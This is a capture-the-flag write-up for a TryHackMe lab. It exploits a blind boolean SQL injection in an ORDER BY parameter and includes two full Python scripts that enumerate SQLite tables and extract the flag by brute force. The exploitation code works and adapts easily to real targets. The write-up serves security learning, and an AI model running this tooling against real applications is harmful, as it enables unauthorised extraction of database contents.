---

Name: Prioritise
Difficulty: Medium
URL: https://tryhackme.com/room/prioritise
Description: In this challenge you will explore some less common SQL Injection techniques.

---


## Enumeration

The application allows us to add tasks and sort them using the `order` parameter:

```text
http://prioritise.thm/?order=title
http://prioritise.thm/?order=done
http://prioritise.thm/?order=date
```

Testing a single quote causes a server error:

```text
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```

This suggests that the value is being passed directly into a SQL query.

I then tested numeric values:

```text
?order=1
?order=2
?order=3
?order=4
```

All four values work, while `5` and higher result in an error. This suggests that the application is likely using the parameter in an `ORDER BY` clause.

Adding `DESC` is also accepted:

```text
?order=title DESC
```

and reverses the task ordering.

This indicates that we can inject SQL expressions into the `ORDER BY` clause.

## SQL Injection

A normal query could look something like:

```sql
SELECT * FROM tasks ORDER BY <input>;
```

Since we can control the expression after `ORDER BY`, we can use a `CASE WHEN` expression to create a boolean oracle:

```sql
CASE WHEN 1=1 THEN title ELSE date END
```

If the condition is true, the query sorts by `title`.

If it is false, it sorts by `date`:

```sql
CASE WHEN 1=2 THEN title ELSE date END
```

I created four tasks with distinct titles and dates so that the two sorting methods are easy to distinguish.

For a true condition, the tasks are returned as:

```text
ads
adw
awdwa
b
```

For a false condition:

```text
ads
b
adw
awdwa
```

Therefore, the ordering of the tasks gives us a **boolean oracle**.

## Extracting the Flag

The application uses SQLite, so we can use `substr()` and `LIKE` to extract the flag one character at a time.

For example:

```sql
CASE
    WHEN (SELECT flag FROM flag) LIKE 'f%'
    THEN title
    ELSE date
END
```

If the flag starts with `f`, the condition is true and the tasks are sorted by `title`.

We can then test:

```text
f%
fl%
fla%
flag%
...
```

until the complete flag is recovered.

I automated this process with Python:

```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

BASE = "http://prioritise.thm/"

session = requests.Session()

CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "_{}-"
)

TRUE_ORDER = ["ads", "adw", "awdwa", "b"]


def get_tasks(condition):
    payload = f"CASE WHEN ({condition}) THEN title ELSE date END"

    r = session.get(
        BASE,
        params={"order": payload},
        timeout=10
    )

    r.raise_for_status()

    soup = BeautifulSoup(r.text, "html.parser")

    tasks = []

    for row in soup.select("tbody tr"):
        cells = row.select("td")

        if len(cells) >= 3:
            tasks.append(cells[1].get_text(strip=True))

    return tasks


def is_true(condition):
    tasks = get_tasks(condition)
    return tasks == TRUE_ORDER


def extract_string(query):
    """
    Extract a single string returned by `query`
    using SQLite substr() + LIKE.
    """

    result = ""

    for position in range(1, 100):

        found = False

        for char in CHARSET:

            candidate = result + char

            condition = (
                f"({query}) LIKE '{candidate}%'"
            )

            if is_true(condition):
                result += char
                found = True

                print(
                    f"      [{position}] {char} -> {result}"
                )

                break

        if not found:
            break

    return result


def get_table_count():
    query = """
        SELECT COUNT(*)
        FROM sqlite_master
        WHERE type='table'
    """

    # We don't actually need to know the exact count.
    # Test increasing values until the condition becomes false.

    for count in range(1, 50):

        condition = f"""
            (
                SELECT COUNT(*)
                FROM sqlite_master
                WHERE type='table'
            ) >= {count}
        """

        if not is_true(condition):
            return count - 1

    return 50


def get_table_name(index):
    query = f"""
        SELECT name
        FROM sqlite_master
        WHERE type='table'
        ORDER BY name
        LIMIT 1 OFFSET {index}
    """

    # Check whether this row exists first.
    condition = f"""
        (
            SELECT COUNT(*)
            FROM sqlite_master
            WHERE type='table'
            LIMIT 1 OFFSET {index}
        ) > 0
    """

    if not is_true(condition):
        return None

    return extract_string(query)


def get_columns(table):
    """
    Get column names using SQLite's PRAGMA table_info().
    """

    columns = []

    # First determine how many columns exist.
    for index in range(20):

        condition = f"""
            (
                SELECT COUNT(*)
                FROM pragma_table_info('{table}')
            ) > {index}
        """

        if not is_true(condition):
            break

        query = f"""
            SELECT name
            FROM pragma_table_info('{table}')
            LIMIT 1 OFFSET {index}
        """

        column = extract_string(query)

        if column:
            columns.append(column)

    return columns


def main():

    print("[*] Testing SQLi oracle...")

    if not is_true("1=1"):
        print("[-] TRUE oracle failed")
        return

    if is_true("1=2"):
        print("[-] FALSE oracle failed")
        return

    print("[+] Oracle works!\n")

    print("[*] Enumerating tables...\n")

    table_count = get_table_count()

    print(f"[+] Found {table_count} tables\n")

    tables = []

    for i in range(table_count):

        print(f"[*] Extracting table #{i + 1}")

        table = get_table_name(i)

        if table:
            tables.append(table)
            print(f"[+] Table: {table}\n")

    print("\n[*] Enumerating columns...\n")

    for table in tables:

        print(f"[+] {table}")

        columns = get_columns(table)

        for column in columns:
            print(f"    └── {column}")

        print()


if __name__ == "__main__":
    main()
```

```bash
$ python3 find_tables.py
[*] Testing SQLi oracle...
[+] Oracle works!

[*] Enumerating tables...

[+] Found 2 tables

[*] Extracting table #1
      [1] f -> f
      [2] l -> fl
      [3] a -> fla
      [4] g -> flag
[+] Table: flag

[*] Extracting table #2

[*] Enumerating columns...

[+] flag
      [1] f -> f
      [2] l -> fl
      [3] a -> fla
      [4] g -> flag
    └── flag
```

Now we have to extract the flag
```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

BASE = "http://prioritise.thm/"

session = requests.Session()

CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "{}_-!@#$%^&*().,:/?+="
)


def get_tasks(condition):
    payload = f"CASE WHEN ({condition}) THEN title ELSE date END"

    r = session.get(
        BASE,
        params={"order": payload},
        timeout=10
    )

    r.raise_for_status()

    soup = BeautifulSoup(r.text, "html.parser")

    tasks = []

    for row in soup.select("tbody tr"):
        cells = row.select("td")

        if len(cells) >= 3:
            tasks.append(cells[1].get_text(strip=True))

    return tasks


def is_true(condition):
    tasks = get_tasks(condition)

    # TRUE  -> title ordering
    # FALSE -> date ordering
    return tasks == ["ads", "adw", "awdwa", "b"]


def test_oracle():
    print("[*] Testing SQLi oracle...")

    if not is_true("1=1"):
        print("[-] TRUE oracle failed")
        return False

    if is_true("1=2"):
        print("[-] FALSE oracle failed")
        return False

    print("[+] Oracle works!")
    return True


def extract_flag():

    flag = ""

    for position in range(1, 100):

        found = False

        for char in CHARSET:

            candidate = flag + char

            condition = (
                f"(SELECT flag FROM flag) LIKE '{candidate}%'"
            )

            if is_true(condition):

                flag += char

                print(
                    f"[+] Position {position}: "
                    f"{char} -> {flag}"
                )

                found = True
                break

        if not found:
            print(
                f"[-] No character found at position {position}"
            )
            break

        if flag.endswith("}"):
            break

    return flag


def main():

    if not test_oracle():
        return

    print("\n[*] Extracting flag...\n")

    flag = extract_flag()

    print("\n[+] Flag:", flag)


if __name__ == "__main__":
    main()
```

Running the script extracts the flag character by character by using the task ordering as a true/false channel.

